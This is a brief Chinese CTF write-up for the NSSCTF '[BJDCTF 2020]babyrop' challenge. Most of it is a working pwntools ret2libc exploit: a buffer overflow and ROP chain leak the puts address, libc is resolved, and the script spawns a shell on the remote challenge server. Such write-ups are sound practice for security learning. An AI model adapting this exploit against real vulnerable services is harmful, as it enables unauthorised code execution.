[[BJDCTF 2020]babyrop | NSSCTF](https://www.nssctf.cn/problem/707)
![[Pasted image 20240901182357.png]]
普通的ret2libc，不做赘述
exp:
```python
from pwn import *
  
context(arch = 'amd64', os = 'linux', log_level = 'debug')
elf = ELF('./babyrop')
local = False
if local:
    p = process('./babyrop')
    # pwnlib.gdb.attach(p, 'b *0x40067D')
else:
    p = remote('node4.anna.nssctf.cn', 28972)
ret = 0x4004c9
rdi = 0x400733
vuln = 0x40067D
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = b'A' * (0x20 + 8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.recvuntil(b'story!\n')
p.sendline(payload)

addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('puts addr: ' + hex(addr))

from LibcSearcher import LibcSearcher
libc = LibcSearcher('puts', addr)
libc_base = addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = b'A' * (0x20 + 8) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.recvuntil(b'story!\n')
p.sendline(payload)
p.interactive()
```
PS：本地wsl日常泄露不出来，话说这是为数不多我的LibcSearcher能搜到libc版本的题目。